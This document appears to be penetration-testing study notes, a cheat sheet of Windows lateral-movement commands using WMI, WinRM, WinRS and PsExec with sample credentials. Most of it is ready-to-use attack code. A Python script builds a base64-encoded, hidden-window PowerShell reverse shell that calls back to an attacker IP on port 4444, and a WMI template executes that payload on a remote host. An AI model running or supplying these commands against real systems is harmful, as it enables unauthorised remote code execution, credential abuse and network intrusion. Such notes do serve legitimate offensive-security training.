# WMI
## wmic
wmic version
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

powershell version (example: create calc process)
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.150.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

## powershell
generate base64 powershell payload
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.x.x",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

runnnig the base64 encoder python script
```bash
python3 encode.py
```

executing the WMI payload with base64 reverse shell
```powershell
$username = 'USERNAME';
$password = 'PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.x.x -Credential $credential -SessionOption $Options
$Command = 'COMAND';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

# WinRM
For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

## winrs
executing commands remotely via WinRS
```cmd
winrs -r:file04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```

## powershell
powersehll remote session via WinRM
```powershell
$username = 'USERNAME';
$password = 'PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.x.x -Credential $credential
Enter-PSSession 1
```


# PsExec
three requisites
```
1. the user that authenticates to the target machine needs to be part of the Administrators local group
2.  the ADMIN$ share must be available
3. File and Printer Sharing has to be turned on

2,3 requirements are already met as they are the default settings on modern Windows Server systems
```

obtaining an interactive shell on the target system with PsExec
```
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
